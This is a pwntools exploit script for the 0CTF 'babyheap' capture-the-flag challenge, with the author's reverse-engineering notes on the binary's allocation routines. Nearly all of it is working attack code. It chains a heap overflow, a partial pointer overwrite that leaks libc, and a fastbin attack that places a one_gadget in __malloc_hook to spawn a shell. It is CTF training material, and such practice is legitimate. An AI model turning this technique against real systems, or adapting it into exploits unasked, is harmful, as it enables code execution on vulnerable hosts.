#!/usr/bin/env python3

from pwn import *

exe = ELF("./0ctfbabyheap")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def alloc(size):
    	r.sendline("1")
    	r.sendline(str(size))

    def fill(idx, size, data):
    	r.sendline("2")
    	r.sendline(str(idx))
    	r.sendline(str(size))
    	r.send(data)

    def free(idx):
    	r.sendline("3")
    	r.sendline(str(idx))

    def dump(idx):
    	r.sendline("4")
    	r.sendline(str(idx))

    # Leak libc address

    alloc(0x20) # 0 fastbin - edit fd of fastbin
    alloc(0x20) # 1 fastbin
    alloc(0x20) # 2 fastbin
    alloc(0x20) # 3 fastbin - edit size of smallbin
    alloc(0x100) # 4 smallbin
    alloc(0x100) # 5 smallbin - prevent consolidation with top chunk

    free(2) # free fastbin
    free(1) # free fastbin

    fill(0, 0x31, "A" * 0x28 + p64(0x31) + "\xc0") # partial overwrite -> smallbin
    fill(3, 0x28+2, "B" * 0x28 + "\x31\x00") # change size of smallbin

    alloc(0x20) # idx 1
    alloc(0x20) # idx 2

    fill(3, 0x28+2, "B" * 0x28 + "\x11\x01") # reset size of small bin
    free(4) # free small bin -> get libc on heap

    dump(2)
    r.recvuntil("Content: \n")
    leak = u64(r.recvn(8))
    libc.address = leak - 0x3c4b78

    log.info("libc base address: {}".format(hex(libc.address)))
    log.info("__malloc_hook address: {}".format(hex(libc.symbols['__malloc_hook']))) 
    
    # fastbin attack __malloc_hook

    return_2hook = libc.symbols['__malloc_hook'] - 0x23
    one_gadget = libc.address + 0x4526a 
    
    alloc(0x60) # 4 fastbin- edit fd of fasting
    alloc(0x60) # 6 fastbin
    alloc(0x60) # 7 fastbin

    free(7)
    free(6)

    fill(4, 0x78, "A" * 0x68 + p64(0x71) + p64(return_2hook))

    alloc(0x60) # idx 6
    alloc(0x60) # idx 7

    fill(7, 0x1b, "A" * 0x13 + p64(one_gadget))

    alloc(0xdeadbeef)
    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO -> no dtors or got
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled


alloc:
	can reuse slots !!!!!!!
	does checks on size. Max 0x1000
	only 16 chunks
	+0 = 1 (allocate check)
	+8 = size
	+0x10 = pointer to chunk

fill:
	checks index
	checks to see if it was allocated
	no upper bound size check -> overflow into other chunks -> fast bin attack 
		if fake chunk in mmap'd zone -> change allocate status; change size; change pointer
				^ THERE ARE SIZES THERE -> stack, libc and mmap'd zone leaks OR stack ELF and heap leak?
free:
	checks on index -1 < idx < 0x10
	checks to see if it was allocated
	+0 = 0
	size = 0
	pointer cleared ???? no double free unless heap leak

dump:
	checks on index
	checks to see if it was allocated
	prints size nr of characters -> info leak?

data~
0: 0x55555643c010
1: 0x55555643c040
2: 0x55555643c070
3: 0x55555643c0a0
4: 0x55555643c0d0
'''